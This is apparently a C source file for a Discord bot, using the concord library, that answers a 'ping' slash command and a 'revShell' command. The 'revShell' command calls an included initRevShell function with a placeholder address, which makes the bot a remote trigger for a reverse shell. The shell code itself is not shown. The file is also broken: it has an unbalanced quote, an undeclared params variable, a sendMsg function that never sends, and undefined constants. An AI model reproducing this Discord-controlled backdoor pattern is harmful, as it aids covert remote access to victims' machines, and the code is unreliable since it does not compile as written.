#include <string.h>
#include <concord/discord.h>
#include "revShell.c"
//https://github.com/Cogmasters/concord

void on_ready(struct discord *client, const struct discord_ready *event) {
    struct discord_create_guild_application_command params = {
        .name = "ping",
        .description = "Ping command!"
    };
    discord_create_guild_application_command(client, event->application->id, GUILD_ID, &params, NULL);
}

void on_interaction(struct discord *client, const struct discord_interaction *event) {
    if (event->type != DISCORD_INTERACTION_APPLICATION_COMMAND)
        return; /* return if interaction isn't a slash command */

    if (strcmp(event->data->name, "ping") == 0) {
          sendMsg("Pong!");
          discord_create_interaction_response(client, event->id, event->token, &params, NULL);
    }
    else if (strcmp(event->data->name, "revShell") == 0) {
          initRevShell("0.0.0.0", 0");
          discord_create_interaction_response(client, event->id, event->token, &params, NULL);
    }
}

void sendMsg(char *msg){
  struct discord_interaction_response params = {
        .type = DISCORD_INTERACTION_CHANNEL_MESSAGE_WITH_SOURCE,
        .data = &(struct discord_interaction_callback_data){
          .content = msg
        }
  };
}

int main(void) {
    struct discord *client = discord_init(BOT_TOKEN);
    discord_set_on_ready(client, &on_ready);
    discord_set_on_interaction_create(client, &on_interaction);
    discord_run(client);
}